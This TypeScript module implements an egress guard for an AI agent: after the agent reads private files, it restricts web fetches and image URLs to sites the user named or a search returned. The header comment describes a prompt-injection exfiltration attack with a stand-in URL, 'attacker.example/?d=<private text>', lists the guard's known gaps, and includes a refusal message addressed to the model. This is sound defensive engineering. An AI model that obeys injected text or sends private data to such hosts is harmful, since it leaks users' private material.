import type { ContentPart } from "../content/types";
import { typedTextOf } from "../security/injection-guard";
import type { ToolDefinition } from "../tools/define-tool";

/**
 * Egress guard (SR-112). A run that has been handed private material, by a tool whose output is the
 * person's own content (`trust: "user_content"`: the file tools, `run_code`, `knowledge_search`,
 * `past_sessions`), is TAINTED for the rest of that `execute`. From then on `web_fetch` may only open a
 * page on a host the person named in one of their own messages, or one a `web_search` in the same run
 * returned. Any other fetch is answered with a refusal instead of running, so text in a file or a page
 * cannot make the model request `https://attacker.example/?d=<private text>`.
 *
 * Reverse it by passing no guard: `invokeToolGuarded` runs exactly as before without one, so removing
 * the `createEgressGuard` line in each runtime (ai-sdk-runtime.ts, stub-runtime.ts) turns it off.
 *
 * What this does not cover: a host the person named is trusted, so text the person pasted into their
 * own message counts as theirs; a host that appears in search results is trusted, so a poisoned
 * result can name one; and a run starts untainted, so a private read in an earlier turn does not
 * carry over (the model sees only the earlier turn's text).
 */

/** What `web_fetch` returns, instead of running, once the run has read private material. */
export type EgressRefusal = {
  readonly ok: false;
  readonly reason: "egress" | "image_source";
  readonly message: string;
};

export type EgressGuard = {
  /** Null when the call may run; the refusal to hand the model, and run nothing, when it may not. */
  beforeCall(toolKey: string, args: unknown): EgressRefusal | null;
  /** Records what a call that has run learned: private material read, and sites a search returned. */
  afterCall(tool: Pick<ToolDefinition, "key" | "trust">, output: unknown): void;
};

export const EGRESS_REFUSAL_MESSAGE =
  "After reading private material, this run can only open pages from sites the person named or a search returned. That site is neither. Do not try another address; ask the person if you need a different site.";

export const IMAGE_SOURCE_REFUSAL_MESSAGE =
  "That image address did not come from this chat. To make a new picture, call the tool again without image_url. To change an image, ask the person to share it.";

const FETCH_TOOL = "web_fetch";
const SEARCH_TOOL = "web_search";
const IMAGE_TOOL = "image_generate";
const GENERATE_TOOLS: ReadonlySet<string> = new Set([IMAGE_TOOL, "video_generate"]);

/**
 * Top-level domains that are far more often a file name in a message (README.md, main.py, run.sh,
 * lib.rs, a.zip, clip.mov) than a site. A bare name ending in one does not name a host; a full URL
 * still does.
 */
const FILE_LIKE_TLDS: ReadonlySet<string> = new Set(["md", "py", "sh", "rs", "zip", "mov"]);

const URL_IN_TEXT = /https?:\/\/[^\s<>"'`()[\]{},;]+/giu;
const EMAIL_IN_TEXT = /[^\s@<>"'`()[\]{},;]+@[^\s@<>"'`()[\]{},;]+/gu;
const BARE_DOMAIN =
  /(?<![\p{L}\p{N}_@.-])(?:[\p{L}\p{N}](?:[\p{L}\p{N}-]{0,61}[\p{L}\p{N}])?\.)+\p{L}{2,63}(?![\p{L}\p{N}_-])/giu;

/** Lowercase (the URL parser already did, and made an IDN punycode), no trailing dot, `www.` folded away. */
function normalizeHostname(hostname: string): string | null {
  const host = hostname.toLowerCase().replace(/\.+$/, "");
  if (!host) {
    return null;
  }
  return host.startsWith("www.") && host.indexOf(".", 4) !== -1 ? host.slice(4) : host;
}

/**
 * The host a fetcher would connect to for `url`, read with the same parser the fetcher uses. Null when
 * it is not a string, not a URL, or has no host.
 */
export function hostOfUrl(url: unknown): string | null {
  if (typeof url !== "string") {
    return null;
  }
  try {
    return normalizeHostname(new URL(url).hostname);
  } catch {
    return null;
  }
}

function hostOfBareDomain(candidate: string): string | null {
  const host = hostOfUrl(`https://${candidate}`);
  if (host === null) {
    return null;
  }
  const tld = host.slice(host.lastIndexOf(".") + 1);
  return FILE_LIKE_TLDS.has(tld) ? null : host;
}

/**
 * Every site a piece of the person's text names: the host of each http(s) URL, then each bare domain
 * (example.com, www.example.com/docs). The domain of an e-mail address does not count: writing to
 * someone is not asking to open their site. Hosts come back lowercased, `www.` folded away, an IDN in
 * punycode, each once, in the order they appear.
 */
export function hostsNamedIn(text: string): string[] {
  const hosts = new Set<string>();
  const urls = text.match(URL_IN_TEXT) ?? [];
  for (const url of urls) {
    const host = hostOfUrl(url);
    if (host !== null) {
      hosts.add(host);
    }
  }
  const rest = text.replace(URL_IN_TEXT, " ").replace(EMAIL_IN_TEXT, " ");
  for (const candidate of rest.match(BARE_DOMAIN) ?? []) {
    const host = hostOfBareDomain(candidate);
    if (host !== null) {
      hosts.add(host);
    }
  }
  return [...hosts];
}

/**
 * The text of the person's own messages in a run's history. Assistant turns and non-text parts are not
 * theirs, and neither is an attached file or pasted text file inside a message (`typedTextOf`): a
 * counterparty's document can name any site, and naming it is not the person asking to open it.
 */
export function userTextOf(history: ReadonlyArray<{ role: string; parts: ReadonlyArray<ContentPart> }>): string[] {
  return history.flatMap((item) =>
    item.role === "user" ? item.parts.flatMap((part) => (part.type === "text" ? [typedTextOf(part.text)] : [])) : [],
  );
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function absoluteUrl(value: string): URL | null {
  try {
    return new URL(value);
  } catch {
    return null;
  }
}

function imageSourceAllowed(args: unknown, typed: string, made: ReadonlySet<string>): boolean {
  const value = isRecord(args) && typeof args.image_url === "string" ? args.image_url.trim() : undefined;
  if (value === undefined) {
    return true;
  }
  const url = absoluteUrl(value);
  if (url === null || url.protocol === "data:") {
    return true;
  }
  if (url.protocol !== "https:" && url.protocol !== "http:") {
    return false;
  }
  return typed.includes(value) || made.has(value);
}

/**
 * The hosts of the result URLs of one `web_search` answer. Only each hit's own `url` counts: a snippet
 * is text from the page, which is the thing an attacker controls.
 */
function searchResultHosts(output: unknown): string[] {
  if (!isRecord(output) || output.success !== true || !isRecord(output.data) || !Array.isArray(output.data.web)) {
    return [];
  }
  return output.data.web.flatMap((hit: unknown) => {
    const host = isRecord(hit) ? hostOfUrl(hit.url) : null;
    return host === null ? [] : [host];
  });
}

/**
 * One guard for a whole `execute`, made by the caller once next to the tool budget, from the person's
 * own messages in that run's history.
 */
export function createEgressGuard(options: { userText: readonly string[] }): EgressGuard {
  const named = new Set(options.userText.flatMap(hostsNamedIn));
  const typed = options.userText.join("\n");
  const made = new Set<string>();
  const searched = new Set<string>();
  let tainted = false;
  return {
    beforeCall(toolKey, args) {
      if (GENERATE_TOOLS.has(toolKey)) {
        return imageSourceAllowed(args, typed, made)
          ? null
          : { ok: false, reason: "image_source", message: IMAGE_SOURCE_REFUSAL_MESSAGE };
      }
      if (!tainted || toolKey !== FETCH_TOOL) {
        return null;
      }
      const host = hostOfUrl(isRecord(args) ? args.url : undefined);
      if (host !== null && (named.has(host) || searched.has(host))) {
        return null;
      }
      return { ok: false, reason: "egress", message: EGRESS_REFUSAL_MESSAGE };
    },
    afterCall(tool, output) {
      if (tool.trust === "user_content") {
        tainted = true;
      }
      if (tool.key === SEARCH_TOOL) {
        for (const host of searchResultHosts(output)) {
          searched.add(host);
        }
      }
      if (tool.key === IMAGE_TOOL && isRecord(output) && output.success === true && typeof output.image === "string") {
        made.add(output.image.trim());
      }
    },
  };
}
